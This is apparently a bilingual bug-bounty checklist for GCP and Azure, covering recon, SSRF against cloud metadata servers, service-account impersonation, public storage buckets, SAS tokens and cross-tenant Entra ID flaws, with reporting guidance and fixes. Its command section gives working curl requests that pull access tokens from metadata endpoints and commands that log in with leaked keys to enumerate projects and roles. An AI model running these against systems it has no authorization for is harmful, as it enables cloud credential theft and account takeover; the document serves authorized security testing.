---
id: clk-cloud-gcp-azure
title: Cloud GCP & Azure
owasp_anchor: [API2:2023, API7:2023]
cwe: [CWE-918, CWE-732]
severity_typical: P1-P2
playbook: playbooks/cloud_gcp_azure.yaml
last_updated: 2026-05-14
sources: []
maturity: stable
---

# GCP & Azure Checklist

> 双语 / Bilingual: GCP metadata server、service account JWT、跨项目 IAM、GCS、Azure Storage SAS、Managed Identity、Function Apps、跨租户。
> 用法：先 Recon 判断 GCP / Azure，再走 metadata SSRF 或 SAS / SP 凭据泄露分支。
> Authorization-only：所有 list / get 调用必须落在 program scope，禁止跨租户枚举。

---

## 1. Recon & 指纹

- [ ] DNS：`*.googleusercontent.com` / `*.appspot.com` / `*.run.app`（GCP）；`*.azurewebsites.net` / `*.blob.core.windows.net` / `*.azureedge.net`（Azure）
- [ ] 反查公网 IP 是否落在 Google / Microsoft 公布的 IP 段
- [ ] 错误回显里出现 `metadata.google.internal` / `kudu` / `WEBSITE_*` 环境变量
- [ ] HTTP header：`x-ms-request-id` / `x-goog-*`
- [ ] OAuth `iss`：`https://accounts.google.com` 或 `https://login.microsoftonline.com/<tid>/v2.0`
- [ ] 找 SSRF：URL fetcher、PDF 渲染、SVG/SVG-XSL、远程缩略图、webhook、SAML AssertionConsumerService 回源

## 2. GCP Metadata Server SSRF

- [ ] 必须带 `Metadata-Flavor: Google` 头（少了直接 403）
- [ ] `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
- [ ] `instance/service-accounts/default/email` 暴露 SA 邮箱
- [ ] `instance/service-accounts/default/scopes` 看 token 作用域
- [ ] `instance/attributes/?recursive=true` 拉所有 instance metadata
- [ ] `project/project-id` / `project/numeric-project-id`
- [ ] `instance/attributes/ssh-keys` / `startup-script`
- [ ] 短链 `metadata` / `169.254.169.254` 都可命中
- [ ] HTTP/2 走私：`Metadata-Flavor` 头能否经反代注入
- [ ] Cloud Run / Cloud Functions 同样支持 metadata server，路径一致

## 3. GCP Service Account / IAM

- [ ] 用拿到的 OAuth token 调 `https://oauth2.googleapis.com/tokeninfo?access_token=...`
- [ ] `gcloud auth activate-service-account --key-file=leaked.json` 后 `gcloud projects list`
- [ ] `iam.serviceAccounts.getAccessToken` 跨 SA 提权（impersonation）
- [ ] `iam.serviceAccountTokenCreator` 角色滥用 → 任意 SA 借用身份
- [ ] `roles/owner` 在 Org / Folder / Project 三层是否被广 grant
- [ ] cross-project：SA 是否在多个 project 都被 bind 角色
- [ ] Workload Identity Federation：trust 条件是否含 `attribute.repository`、`attribute.ref` 限制（GitHub OIDC）
- [ ] 集群内 GKE Workload Identity：Pod 能否拿到 node SA token

## 4. GCS 公开桶 / 资源策略

- [ ] `gsutil ls -L gs://bucket` / `curl https://storage.googleapis.com/bucket/?list-type=2`
- [ ] `allUsers` / `allAuthenticatedUsers` 出现在 IAM
- [ ] `storage.objects.list` 公开 → 列文件
- [ ] `storage.objects.create` 公开 → 任意上传（高危）
- [ ] Signed URL 时长 / 是否包含 `x-goog-meta-*` 受信任头
- [ ] Pub/Sub topic / BigQuery dataset 公开访问

## 5. Azure Metadata / Managed Identity

- [ ] `http://169.254.169.254/metadata/instance?api-version=2021-12-13`（必须 `Metadata: true` 头）
- [ ] `metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`
- [ ] System-assigned vs User-assigned MI：`&client_id=<uami-client-id>` 切换身份
- [ ] App Service / Function App：环境变量 `IDENTITY_ENDPOINT` + `IDENTITY_HEADER`，请求时带 `X-IDENTITY-HEADER`
- [ ] Azure Arc 启用机器：`IMDS_ENDPOINT` 走 challenge-response（41 字节 file 验证）
- [ ] Container Instance / AKS pod identity（Workload Identity）
- [ ] Logic Apps / Automation Account 内置 MI

## 6. Azure Storage SAS / Blob

- [ ] SAS token 权限位 `sp=racwdl`（read/add/create/write/delete/list），太宽就报
- [ ] `se=` 过期时间 > 1 年
- [ ] `sip=` 缺失（无 IP 限制）
- [ ] `spr=https` 是否强制
- [ ] 用户委派 SAS（`skoid` / `sktid`）vs Account SAS：后者权限范围更大
- [ ] 容器 Public Access Level：`Container` / `Blob` 公开列出
- [ ] 静态网站 `$web` 容器是否泄露 build artifact

## 7. Azure AD / Entra ID 跨租户

- [ ] AAD multi-tenant app：`tid` claim 不校验 → 任意租户用户登录
- [ ] `appid` / `aud` 校验缺失
- [ ] Service Principal 凭据泄露（`AZURE_CLIENT_SECRET` 在 GitHub / Docker 镜像 / Function App 环境变量）
- [ ] `subscription_id` 枚举：泄露的 SP 是否能列其他订阅
- [ ] B2C policy 配错：`signUpSignIn` 接受外部 IdP 不验证邮箱
- [ ] Graph API 滥用：`Application.ReadWrite.All` / `RoleManagement.ReadWrite.Directory`

## 8. 自动化辅助

```bash
# GCP metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Azure App Service Managed Identity
curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01"

# GCP SA key triage
gcloud auth activate-service-account --key-file=key.json
gcloud projects list
gcloud auth print-access-token

# Azure SP triage
az login --service-principal -u "$CLIENT_ID" -p "$CLIENT_SECRET" --tenant "$TID"
az account list --output table
az role assignment list --assignee "$CLIENT_ID"

# GCS public bucket scan
gsutil ls -L gs://target-bucket
curl -s "https://storage.googleapis.com/storage/v1/b/target-bucket/iam"

# Azure Storage anonymous list
curl "https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list"

# Nuclei
nuclei -tags gcp,azure,ssrf,exposed-tokens -u https://target

# 公开工具（仅自有租户）
# https://github.com/dirkjanm/ROADtools
# https://github.com/NetSPI/MicroBurst
# https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
```

## 9. Reporting Angle

* **Title 模板**：`<云> <服务> <flaw> allows <impact> via <vector>`
  例：`Image proxy SSRF leaks GCP service account access token via metadata.google.internal`
* **CVSS 3.1 上下界**：
  * 拿到 SA / MI access token 且 scope 含 cloud-platform / management.azure.com：8.5-9.8 / VRT P1
  * 仅泄露 SA 邮箱 / 项目 ID（无 token）：4.3-5.3 / VRT P4
  * 公开 GCS / Blob 列出敏感数据：6.5-8.0 / VRT P2
* **CWE 推荐**：CWE-918（SSRF）/ CWE-732（资源策略错配）
* **PoC 必须**：完整请求 / token 仅前 6 + 后 4 字符 / `tokeninfo` 输出截断 scope；自带测试租户 / 自有项目示例
* **Suggested Fix**（≥ 2 条）：
  * SSRF 出网默认拒绝 RFC1918、169.254.0.0/16、`metadata.google.internal`
  * 强制 IMDS 头校验 + Egress proxy denylist
  * Workload Identity Federation 收紧 `attribute.*` 条件，禁止 wildcard
  * SAS token 缩短有效期、加 `sip=` IP 限制
  * 关闭无意义的 multi-tenant 配置 / 强制 `tid` 白名单

## 10. 已迁移技法（来自 KB）

- [[techniques/gcp_metadata_ssrf|GCP metadata SSRF 拿 SA token]]
- [[techniques/azure_imds_managed_identity|Azure IMDS Managed Identity 利用]]
- [[techniques/azure_storage_sas_abuse|Azure SAS 权限滥用]]
- [[techniques/gcp_sa_impersonation|GCP SA Impersonation 链]]
